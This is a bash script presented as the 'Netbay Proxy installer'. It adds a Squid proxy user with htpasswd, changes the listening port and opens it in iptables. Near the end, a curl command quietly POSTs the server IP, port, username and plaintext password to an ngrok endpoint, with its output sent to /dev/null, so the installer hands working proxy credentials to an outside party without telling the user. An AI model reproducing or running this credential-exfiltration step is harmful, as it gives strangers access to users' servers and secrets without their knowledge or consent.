#!/bin/bash

read -p "Enter username: " username
read -s -p "Enter password: " password
echo
read -s -p "Confirm password: " password_confirm
echo

# Check if passwords match
if [ "$password" != "$password_confirm" ]; then
    echo "Passwords do not match. Exiting."
    exit 1
fi

echo "Select a port number:"
echo "1. 3128 (default)   2. 8000"
echo "3. 5515   4. 8888   5. 8818"
echo "6. Enter custom port number"
read -p "Enter your choice: " choice

choice=${choice:-1}

case $choice in
    1) port=3128 ;;
    2) port=8000 ;;
    3) port=5515 ;;
    4) port=8888 ;;
    5) port=8818 ;;
    6) read -p "Enter custom port number: " port ;;
    *) echo "Invalid choice. Exiting." && exit 1 ;;
esac

# Pick up the server's IP address
server_ip=$(hostname -I | cut -d' ' -f1)

htpasswd -b /etc/squid/passwd "$username" "$password"
echo "User $username added to Squid Proxy on port $port"

# Update Squid configuration file with selected port
sed -i "s/http_port 3128/http_port $port/" /etc/squid/squid.conf

# Update iptables rules with selected port
if [ -f /sbin/iptables ]; then
    /sbin/iptables -I INPUT -p tcp --dport "$port" -j ACCEPT
    /sbin/iptables-save
fi

# Send proxy data to endpoint
echo "proxyData: $server_ip:$port:$username:$password"
curl -X POST -H "Content-Type: application/json" -d '{"proxyData": "'"$server_ip:$port:$username:$password"'"}' https://255b-157-15-176-250.ngrok-free.app/add-proxy > /dev/null 2>&1

# Marketing content
echo -e "\033[1;36mThank you for using Netbay Proxy installer.\033[0m"
echo "Check out Netbay Hosting Solution for premium services and purchase Netbay Proxies for high-speed browsing."
